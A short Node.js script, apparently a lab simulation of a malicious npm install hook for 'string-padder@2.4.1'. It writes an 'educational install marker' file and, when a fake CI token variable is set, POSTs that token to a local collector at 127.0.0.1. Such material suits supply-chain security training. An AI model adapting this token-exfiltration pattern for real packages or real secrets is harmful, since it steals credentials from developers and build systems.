const { mkdirSync, writeFileSync } = require('node:fs');
const { join } = require('node:path');
if (process.env.LAB_MARKER_DIR) {
  mkdirSync(process.env.LAB_MARKER_DIR, { recursive: true });
  writeFileSync(join(process.env.LAB_MARKER_DIR, 'string-padder-2.4.1.txt'), '교육용 설치 표식\n');
}
if (process.env.LAB_FAKE_CI_TOKEN) {
  fetch('http://127.0.0.1:4880/marker', {
    method: 'POST',
    headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ package: 'string-padder@2.4.1', token: process.env.LAB_FAKE_CI_TOKEN }),
  }).catch(error => console.error(`로컬 수집기 연결 실패: ${error.message}`));
}

